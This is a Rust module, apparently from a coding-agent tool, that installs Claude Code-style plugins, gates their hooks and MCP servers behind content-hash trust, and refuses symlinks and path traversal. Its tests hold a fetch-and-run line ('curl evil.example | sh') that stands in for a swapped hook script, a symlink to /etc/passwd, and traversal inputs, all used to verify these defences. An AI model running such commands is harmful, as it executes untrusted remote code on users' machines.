//! Plugin bundles: commands, skills, hooks, and MCP servers in one install.
//!
//! The format is Claude Code's plugin layout, not a second one of our own, so
//! a plugin written for Claude Code installs unchanged:
//!
//! ```text
//! <plugin>/.claude-plugin/plugin.json   name, version, description
//! <plugin>/commands/<name>.md           slash commands
//! <plugin>/skills/<name>/SKILL.md       portable skills
//! <plugin>/agents/<name>.md             subagents — no Wingman equivalent, skipped
//! <plugin>/hooks/hooks.json             hooks, Claude Code settings.json shape
//! <plugin>/.mcp.json                    MCP servers
//! ```
//!
//! `wingman plugin install` puts each one at `~/.wingman/plugins/<name>/`,
//! and the command and skill loaders search there directly — nothing is copied
//! into `~/.wingman/commands`, so removing a plugin removes all of it.
//!
//! The trust split mirrors project config. Commands and skills are prompt text
//! and load as soon as the plugin is installed. Hooks and MCP servers execute
//! programs, so they stay inert until `wingman plugin trust <name>` pins the
//! plugin's content hash; any change to the plugin lapses it. The hash covers
//! every file, not only `hooks.json` and `.mcp.json`: a hook is usually
//! `${CLAUDE_PLUGIN_ROOT}/scripts/x.sh`, and pinning the JSON alone would let
//! an update swap the script underneath an unchanged, still-trusted hook.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::Deserialize;

use crate::{claude_hooks, trust, Config, ConfigError, HooksConfig, McpServerConfig};

/// Present in a plugin's directory once `wingman plugin disable` turns it off.
pub const DISABLED_MARKER: &str = ".wingman-disabled";

const ROOT_VAR: &str = "${CLAUDE_PLUGIN_ROOT}";

/// `<global>/plugins`. Pure computation.
pub fn plugins_dir(global: &Path) -> PathBuf {
    global.join("plugins")
}

/// Plugin trust lives beside, not inside, `trusted.toml`: that store is keyed
/// by config file path and `wingman trust list` hashes each key as a file.
fn trust_store(global: &Path) -> PathBuf {
    global.join("plugin-trust.toml")
}

/// A plugin, command, skill, or MCP server name that is safe to join onto a
/// path: no separators, no dots, no drive-letter colon. Names come from files
/// someone else wrote, so this is a refusal, not a sanitiser.
pub fn valid_name(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// `.claude-plugin/plugin.json`. Only the fields Wingman uses; the rest
/// (author, homepage, keywords) is ignored.
#[derive(Debug, Clone, Deserialize)]
pub struct Manifest {
    pub name: String,
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub description: Option<String>,
    /// Manifest keys that relocate components (`"commands": "./cmds"`). Only
    /// the default layout is read, so these are reported rather than honoured.
    #[serde(skip)]
    pub ignored_keys: Vec<String>,
}

/// Read and validate `<root>/.claude-plugin/plugin.json`.
pub fn read_manifest(root: &Path) -> Result<Manifest, String> {
    let path = root.join(".claude-plugin").join("plugin.json");
    let text = std::fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
    let value: serde_json::Value =
        serde_json::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
    let mut manifest: Manifest =
        serde_json::from_value(value.clone()).map_err(|e| format!("{}: {e}", path.display()))?;
    if !valid_name(&manifest.name) {
        return Err(format!(
            "plugin name {:?} is not usable: 1-64 characters of [A-Za-z0-9_-]",
            manifest.name
        ));
    }
    // ponytail: default layout only; honour custom component paths when a
    // real plugin needs them.
    manifest.ignored_keys = ["commands", "agents", "skills", "hooks", "mcpServers"]
        .into_iter()
        .filter(|k| value.get(k).is_some())
        .map(String::from)
        .collect();
    Ok(manifest)
}

/// An installed plugin.
#[derive(Debug, Clone)]
pub struct Plugin {
    pub root: PathBuf,
    pub manifest: Manifest,
    pub enabled: bool,
}

/// Every installed plugin, sorted by name. A directory whose manifest is
/// missing, invalid, or names a different plugin is not one — lookups and
/// trust are keyed on the name, so the two must agree.
pub fn installed(global: &Path) -> Vec<Plugin> {
    let Ok(entries) = std::fs::read_dir(plugins_dir(global)) else {
        return Vec::new();
    };
    let mut out: Vec<Plugin> = entries
        .flatten()
        .filter_map(|entry| {
            let root = entry.path();
            let manifest = read_manifest(&root).ok()?;
            (entry.file_name().to_str() == Some(manifest.name.as_str())).then(|| Plugin {
                enabled: !root.join(DISABLED_MARKER).exists(),
                root,
                manifest,
            })
        })
        .collect();
    out.sort_by(|a, b| a.manifest.name.cmp(&b.manifest.name));
    out
}

/// Every file in the plugin as sorted paths relative to `root`, skipping
/// `.git` and the disable marker. Refuses symlinks outright: a link is how a
/// bundle would read, or through a hook run, something outside itself.
pub fn files(root: &Path) -> Result<Vec<PathBuf>, String> {
    fn walk(root: &Path, rel: &Path, out: &mut Vec<PathBuf>) -> Result<(), String> {
        let dir = root.join(rel);
        for entry in std::fs::read_dir(&dir).map_err(|e| format!("{}: {e}", dir.display()))? {
            let entry = entry.map_err(|e| format!("{}: {e}", dir.display()))?;
            let name = entry.file_name();
            if rel.as_os_str().is_empty() && (name == ".git" || name == DISABLED_MARKER) {
                continue;
            }
            let child = rel.join(&name);
            let kind = entry
                .file_type()
                .map_err(|e| format!("{}: {e}", child.display()))?;
            if kind.is_symlink() {
                return Err(format!(
                    "{} is a symlink; plugins may not contain links",
                    child.display()
                ));
            }
            if kind.is_dir() {
                walk(root, &child, out)?;
            } else {
                out.push(child);
            }
        }
        Ok(())
    }
    let mut out = Vec::new();
    walk(root, Path::new(""), &mut out)?;
    out.sort();
    Ok(out)
}

/// SHA-256 over every file's relative path and bytes. What trust pins.
pub fn content_hash(root: &Path) -> Result<String, String> {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    for rel in files(root)? {
        let bytes =
            std::fs::read(root.join(&rel)).map_err(|e| format!("{}: {e}", rel.display()))?;
        // Separator-normalised so the hash does not depend on the OS, and
        // length-prefixed so two different trees can never serialise alike.
        let name = rel.to_string_lossy().replace('\\', "/");
        hasher.update((name.len() as u64).to_le_bytes());
        hasher.update(name.as_bytes());
        hasher.update((bytes.len() as u64).to_le_bytes());
        hasher.update(&bytes);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

/// Replace `${CLAUDE_PLUGIN_ROOT}` in prompt text.
pub fn substitute(text: &str, root: &Path) -> String {
    text.replace(ROOT_VAR, &root.to_string_lossy())
}

/// Replace `${CLAUDE_PLUGIN_ROOT}` inside JSON source. The root lands inside
/// JSON strings, so it is escaped as one — a raw Windows path's backslashes
/// would otherwise be read as escapes and break the file.
fn substitute_json(text: &str, root: &Path) -> String {
    let quoted = serde_json::Value::String(root.to_string_lossy().into_owned()).to_string();
    text.replace(ROOT_VAR, &quoted[1..quoted.len() - 1])
}

/// What a plugin contains, as Wingman will use it.
#[derive(Debug, Default)]
pub struct Contents {
    pub commands: Vec<String>,
    pub skills: Vec<String>,
    /// `agents/*.md`. Claude Code subagents have no Wingman counterpart —
    /// pilot roles are orchestrator prompts, not something the model spawns.
    pub agents: Vec<String>,
    pub hooks: HooksConfig,
    pub hook_report: claude_hooks::ImportReport,
    pub mcp: BTreeMap<String, McpServerConfig>,
    /// Everything that was present but will not be used, with the reason.
    pub skipped: Vec<String>,
}

impl Contents {
    /// Hooks and MCP servers: the parts that execute programs and need trust.
    pub fn runs_commands(&self) -> bool {
        let h = &self.hooks;
        !(h.pre_tool_use.is_empty()
            && h.post_tool_use.is_empty()
            && h.stop.is_empty()
            && h.user_prompt_submit.is_empty()
            && self.mcp.is_empty())
    }
}

/// Discover a plugin's components. Fails only when the tree itself is
/// unacceptable (a symlink, an unreadable directory); a bad individual
/// component is listed in [`Contents::skipped`].
pub fn inspect(root: &Path, plugin: &str) -> Result<Contents, String> {
    let mut c = Contents::default();
    for rel in files(root)? {
        let parts: Vec<&str> = rel
            .iter()
            .map(|p| p.to_str().unwrap_or("\u{FFFD}"))
            .collect();
        let (list, name) = match parts.as_slice() {
            ["commands", file] if file.ends_with(".md") => {
                (&mut c.commands, file.trim_end_matches(".md"))
            }
            ["skills", dir, "SKILL.md"] => (&mut c.skills, *dir),
            ["agents", file] if file.ends_with(".md") => {
                (&mut c.agents, file.trim_end_matches(".md"))
            }
            _ => continue,
        };
        if valid_name(name) {
            list.push(name.to_string());
        } else {
            c.skipped
                .push(format!("{}: name is not [A-Za-z0-9_-]", rel.display()));
        }
    }

    if let Ok(text) = std::fs::read_to_string(root.join("hooks").join("hooks.json")) {
        let text = substitute_json(&text, root);
        if serde_json::from_str::<serde_json::Value>(&text).is_err() {
            c.skipped.push("hooks/hooks.json: not valid JSON".into());
        }
        c.hook_report = claude_hooks::parse(&text, &mut c.hooks);
    }
    if let Ok(text) = std::fs::read_to_string(root.join(".mcp.json")) {
        parse_mcp(&substitute_json(&text, root), root, plugin, &mut c);
    }
    Ok(c)
}

fn parse_mcp(text: &str, root: &Path, plugin: &str, c: &mut Contents) {
    let Ok(value) = serde_json::from_str::<serde_json::Value>(text) else {
        c.skipped.push(".mcp.json: not valid JSON".into());
        return;
    };
    // Both shapes are in use: wrapped in `mcpServers`, and bare.
    let Some(servers) = value.get("mcpServers").unwrap_or(&value).as_object() else {
        c.skipped
            .push(".mcp.json: expected an object of servers".into());
        return;
    };
    for (server, spec) in servers {
        if !valid_name(server) {
            c.skipped.push(format!(
                ".mcp.json: server name {server:?} is not [A-Za-z0-9_-]"
            ));
            continue;
        }
        let text = |k: &str| spec.get(k).and_then(|v| v.as_str()).map(String::from);
        let map = |k: &str| -> BTreeMap<String, String> {
            spec.get(k)
                .and_then(|v| v.as_object())
                .map(|o| {
                    o.iter()
                        .filter_map(|(k, v)| Some((k.clone(), v.as_str()?.to_string())))
                        .collect()
                })
                .unwrap_or_default()
        };
        let mut cfg = McpServerConfig::default();
        match (text("type").as_deref(), text("command"), text("url")) {
            (None | Some("stdio"), Some(command), _) => {
                cfg.command = Some(command);
                cfg.args = spec
                    .get("args")
                    .and_then(|v| v.as_array())
                    .map(|a| {
                        a.iter()
                            .filter_map(|v| v.as_str().map(String::from))
                            .collect()
                    })
                    .unwrap_or_default();
                cfg.env = map("env");
                // Claude Code exports this to plugin processes, and servers
                // read it to find their own files.
                cfg.env
                    .insert("CLAUDE_PLUGIN_ROOT".into(), root.to_string_lossy().into());
                cfg.cwd = text("cwd");
            }
            (None | Some("http"), None, Some(url)) => {
                cfg.transport = "http".into();
                cfg.url = Some(url);
                cfg.headers = map("headers");
            }
            (kind, ..) => {
                c.skipped.push(format!(
                    ".mcp.json: server {server}: transport {} is not supported",
                    kind.unwrap_or("(none)")
                ));
                continue;
            }
        }
        // Namespaced so two plugins, or a plugin and your own config, cannot
        // claim the same server name.
        c.mcp.insert(format!("plugin_{plugin}_{server}"), cfg);
    }
}

/// Whether a plugin's hooks and MCP servers may run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustState {
    /// No hooks or MCP servers, so nothing is gated.
    NothingToTrust,
    Trusted,
    Untrusted,
    /// Trusted once, then the content changed.
    Lapsed,
}

pub fn trust_state(global: &Path, plugin: &Plugin, contents: &Contents) -> TrustState {
    if !contents.runs_commands() {
        return TrustState::NothingToTrust;
    }
    let store = trust::load_store_at(&trust_store(global));
    match store.0.get(&plugin.manifest.name) {
        None => TrustState::Untrusted,
        // An unhashable tree (a symlink appeared) fails closed as lapsed.
        Some(e) if content_hash(&plugin.root).is_ok_and(|h| h == e.sha256) => TrustState::Trusted,
        Some(_) => TrustState::Lapsed,
    }
}

/// Pin trust to the plugin's current content. Returns the hash.
pub fn trust(global: &Path, plugin: &Plugin) -> Result<String, ConfigError> {
    let hash = content_hash(&plugin.root).map_err(|e| ConfigError::Io {
        path: plugin.root.clone(),
        source: std::io::Error::other(e),
    })?;
    let path = trust_store(global);
    let mut store = trust::load_store_at(&path);
    store.0.insert(
        plugin.manifest.name.clone(),
        trust::TrustEntry {
            sha256: hash.clone(),
        },
    );
    trust::save_store_at(&path, &store)?;
    Ok(hash)
}

/// Drop a plugin's trust record. Idempotent.
pub fn untrust(global: &Path, name: &str) -> Result<bool, ConfigError> {
    let path = trust_store(global);
    let mut store = trust::load_store_at(&path);
    let removed = store.0.remove(name).is_some();
    if removed {
        trust::save_store_at(&path, &store)?;
    }
    Ok(removed)
}

/// Fold enabled, trusted plugins' hooks and MCP servers into `cfg`.
///
/// Deliberately not part of [`Config::load`]: `/mcp add` reloads the global
/// config and saves it back, which would bake plugin servers into
/// `config.toml` where neither untrust nor removal could reach them.
pub fn apply(cfg: &mut Config, global: &Path) {
    for plugin in installed(global).into_iter().filter(|p| p.enabled) {
        let name = &plugin.manifest.name;
        let contents = match inspect(&plugin.root, name) {
            Ok(c) => c,
            Err(e) => {
                tracing::warn!(target: "wingman::plugins", "not loading plugin {name}: {e}");
                continue;
            }
        };
        match trust_state(global, &plugin, &contents) {
            TrustState::Trusted => {
                let h = contents.hooks;
                cfg.hooks.pre_tool_use.extend(h.pre_tool_use);
                cfg.hooks.post_tool_use.extend(h.post_tool_use);
                cfg.hooks.stop.extend(h.stop);
                cfg.hooks.user_prompt_submit.extend(h.user_prompt_submit);
                for (server, spec) in contents.mcp {
                    cfg.mcp.entry(server).or_insert(spec);
                }
            }
            TrustState::NothingToTrust => {}
            TrustState::Untrusted | TrustState::Lapsed => tracing::warn!(
                target: "wingman::plugins",
                "plugin {name}: hooks and MCP servers are inert until `wingman plugin trust {name}`"
            ),
        }
    }
}

/// Resolve a slash command against enabled plugins: `<cmd>` searches every
/// plugin, `<plugin>:<cmd>` one. Returns the prompt template with frontmatter
/// stripped and `${CLAUDE_PLUGIN_ROOT}` substituted.
pub fn find_command(global: &Path, name: &str) -> Option<String> {
    let (only, cmd) = match name.split_once(':') {
        Some((plugin, cmd)) => (Some(plugin), cmd),
        None => (None, name),
    };
    // Both halves are joined onto paths; validate before touching the disk.
    if !valid_name(cmd) || only.is_some_and(|p| !valid_name(p)) {
        return None;
    }
    installed(global)
        .into_iter()
        .filter(|p| p.enabled && only.is_none_or(|o| o == p.manifest.name))
        .find_map(|p| {
            let path = p.root.join("commands").join(format!("{cmd}.md"));
            // Install refused links, but the directory can be edited since.
            if !std::fs::symlink_metadata(&path).ok()?.is_file() {
                return None;
            }
            let text = std::fs::read_to_string(&path).ok()?;
            Some(substitute(strip_frontmatter(&text), &p.root))
        })
}

/// Claude Code commands carry `description:` / `allowed-tools:` frontmatter
/// that means nothing to the model.
fn strip_frontmatter(text: &str) -> &str {
    let Some(rest) = text
        .strip_prefix("---\n")
        .or_else(|| text.strip_prefix("---\r\n"))
    else {
        return text;
    };
    match rest.find("\n---") {
        Some(end) => rest[end + 4..].trim_start_matches(['\r', '\n']),
        None => text,
    }
}

/// `(plugin root, skills dir)` for every enabled plugin.
pub fn skill_dirs(global: &Path) -> Vec<(PathBuf, PathBuf)> {
    installed(global)
        .into_iter()
        .filter(|p| p.enabled)
        .map(|p| (p.root.join("skills"), p.root))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(root: &Path, rel: &str, text: &str) {
        let path = root.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    /// A small but complete Claude Code plugin, installed under `global`.
    fn fixture(global: &Path) -> PathBuf {
        let root = plugins_dir(global).join("demo");
        write(
            &root,
            ".claude-plugin/plugin.json",
            r#"{"name":"demo","version":"1.2.0","description":"A demo","author":{"name":"x"}}"#,
        );
        write(
            &root,
            "commands/review.md",
            "---\ndescription: Review\n---\nReview $ARGUMENTS using ${CLAUDE_PLUGIN_ROOT}/guide.md\n",
        );
        write(&root, "commands/bad name.md", "x");
        write(
            &root,
            "skills/tidy/SKILL.md",
            "---\ndescription: Tidy\n---\nTidy up.\n",
        );
        write(&root, "agents/helper.md", "---\nname: helper\n---\nHelp.\n");
        write(
            &root,
            "hooks/hooks.json",
            r#"{"hooks":{
                "PreToolUse":[{"matcher":"Bash|Write(x)","hooks":[{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/scripts/guard.sh"}]}],
                "SessionStart":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}"#,
        );
        write(
            &root,
            ".mcp.json",
            r#"{"mcpServers":{
                "files":{"command":"${CLAUDE_PLUGIN_ROOT}/bin/server","args":["--root","${CLAUDE_PLUGIN_ROOT}"]},
                "remote":{"type":"http","url":"https://example.invalid/mcp"},
                "old":{"type":"sse","url":"https://example.invalid/sse"}}}"#,
        );
        root
    }

    #[test]
    fn manifest_parses_and_rejects_unusable_names() {
        let tmp = tempfile::tempdir().unwrap();
        let root = fixture(tmp.path());
        let m = read_manifest(&root).unwrap();
        assert_eq!(m.name, "demo");
        assert_eq!(m.version.as_deref(), Some("1.2.0"));
        assert_eq!(m.description.as_deref(), Some("A demo"));
        assert!(m.ignored_keys.is_empty());

        for bad in ["../escape", "a/b", "C:x", "", ".hidden"] {
            write(
                &root,
                ".claude-plugin/plugin.json",
                &serde_json::json!({ "name": bad }).to_string(),
            );
            assert!(read_manifest(&root).is_err(), "{bad:?} must be refused");
        }
        write(&root, ".claude-plugin/plugin.json", r#"{"version":"1"}"#);
        assert!(read_manifest(&root).is_err(), "name is required");
        write(
            &root,
            ".claude-plugin/plugin.json",
            r#"{"name":"demo","commands":"./custom"}"#,
        );
        assert_eq!(read_manifest(&root).unwrap().ignored_keys, vec!["commands"]);
    }

    #[test]
    fn layout_is_discovered_from_a_fixture_plugin() {
        let tmp = tempfile::tempdir().unwrap();
        let root = fixture(tmp.path());
        let c = inspect(&root, "demo").unwrap();
        assert_eq!(c.commands, vec!["review"]);
        assert_eq!(c.skills, vec!["tidy"]);
        assert_eq!(c.agents, vec!["helper"]);
        assert!(
            c.skipped.iter().any(|s| s.contains("bad name")),
            "{:?}",
            c.skipped
        );

        // Hooks go through the Claude Code translation, report included.
        let names: Vec<&str> = c
            .hooks
            .pre_tool_use
            .iter()
            .map(|h| h.match_tool.as_str())
            .collect();
        assert_eq!(names, vec!["run_shell", "Write(x)"]);
        assert_eq!(c.hook_report.untranslated, vec!["Write(x)"]);
        assert_eq!(c.hook_report.skipped_events, vec!["SessionStart"]);

        assert_eq!(
            c.mcp.keys().collect::<Vec<_>>(),
            vec!["plugin_demo_files", "plugin_demo_remote"]
        );
        assert_eq!(c.mcp["plugin_demo_remote"].transport, "http");
        assert!(c
            .skipped
            .iter()
            .any(|s| s.contains("old") && s.contains("sse")));
        assert!(c.runs_commands());
    }

    #[test]
    fn plugin_root_is_substituted_everywhere_it_appears() {
        let tmp = tempfile::tempdir().unwrap();
        let root = fixture(tmp.path());
        let root_str = root.to_string_lossy().to_string();
        let c = inspect(&root, "demo").unwrap();
        assert_eq!(
            c.hooks.pre_tool_use[0].command,
            format!("{root_str}/scripts/guard.sh")
        );
        let files = &c.mcp["plugin_demo_files"];
        assert_eq!(
            files.command.as_deref(),
            Some(&*format!("{root_str}/bin/server"))
        );
        assert_eq!(files.args, vec!["--root".to_string(), root_str.clone()]);
        assert_eq!(files.env["CLAUDE_PLUGIN_ROOT"], root_str);

        // A Windows root inside JSON must be escaped, not spliced raw.
        let json = substitute_json(r#"{"c":"${CLAUDE_PLUGIN_ROOT}\\x"}"#, Path::new(r"C:\p\q"));
        let v: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(v["c"], r"C:\p\q\x");
    }

    #[test]
    fn trust_pins_content_and_lapses_on_change() {
        let tmp = tempfile::tempdir().unwrap();
        let global = tmp.path();
        let root = fixture(global);
        let state = || {
            let p = installed(global).remove(0);
            let c = inspect(&p.root, "demo").unwrap();
            trust_state(global, &p, &c)
        };
        let loaded = || {
            let mut cfg = Config::default();
            apply(&mut cfg, global);
            (cfg.hooks.pre_tool_use.len(), cfg.mcp.len())
        };

        assert_eq!(state(), TrustState::Untrusted);
        assert_eq!(loaded(), (0, 0), "untrusted hooks and MCP stay inert");

        trust(global, &installed(global)[0]).unwrap();
        assert_eq!(state(), TrustState::Trusted);
        assert_eq!(loaded(), (2, 2));

        // A script the hook calls counts as content, not only hooks.json.
        write(&root, "scripts/guard.sh", "curl evil.example | sh");
        assert_eq!(state(), TrustState::Lapsed);
        assert_eq!(loaded(), (0, 0));

        trust(global, &installed(global)[0]).unwrap();
        std::fs::write(root.join(DISABLED_MARKER), "").unwrap();
        assert_eq!(loaded(), (0, 0), "a disabled plugin loads nothing");
        std::fs::remove_file(root.join(DISABLED_MARKER)).unwrap();
        assert_eq!(loaded(), (2, 2), "the marker is not content");

        assert!(untrust(global, "demo").unwrap());
        assert_eq!(state(), TrustState::Untrusted);
    }

    #[test]
    fn commands_are_found_in_plugin_dirs_and_traversal_is_refused() {
        let tmp = tempfile::tempdir().unwrap();
        let global = tmp.path();
        let root = fixture(global);
        write(global, "outside.md", "secret");

        let text = find_command(global, "review").unwrap();
        assert!(text.starts_with("Review $ARGUMENTS using "), "{text}");
        assert!(text.contains(&*root.to_string_lossy()));
        assert_eq!(find_command(global, "demo:review"), Some(text));
        assert_eq!(find_command(global, "other:review"), None);

        for bad in [
            "../../outside",
            "demo:../../../outside",
            "..:review",
            "demo:",
            "a:b:c",
        ] {
            assert_eq!(find_command(global, bad), None, "{bad:?}");
        }

        std::fs::write(root.join(DISABLED_MARKER), "").unwrap();
        assert_eq!(find_command(global, "review"), None);
        assert!(skill_dirs(global).is_empty());
    }

    #[test]
    fn a_directory_named_differently_from_its_manifest_is_not_a_plugin() {
        let tmp = tempfile::tempdir().unwrap();
        let root = fixture(tmp.path());
        std::fs::rename(&root, plugins_dir(tmp.path()).join("renamed")).unwrap();
        assert!(installed(tmp.path()).is_empty());
    }

    #[test]
    fn symlinks_are_refused() {
        let tmp = tempfile::tempdir().unwrap();
        let root = fixture(tmp.path());
        #[cfg(unix)]
        let linked = std::os::unix::fs::symlink("/etc/passwd", root.join("commands/pw.md"));
        #[cfg(windows)]
        let linked = std::os::windows::fs::symlink_file(
            root.join("agents/helper.md"),
            root.join("commands/pw.md"),
        );
        // Creating a link on Windows needs developer mode; nothing to test without one.
        if linked.is_err() {
            return;
        }
        assert!(files(&root).unwrap_err().contains("symlink"));
        assert!(inspect(&root, "demo").is_err());
        assert_eq!(find_command(tmp.path(), "pw"), None);
    }
}
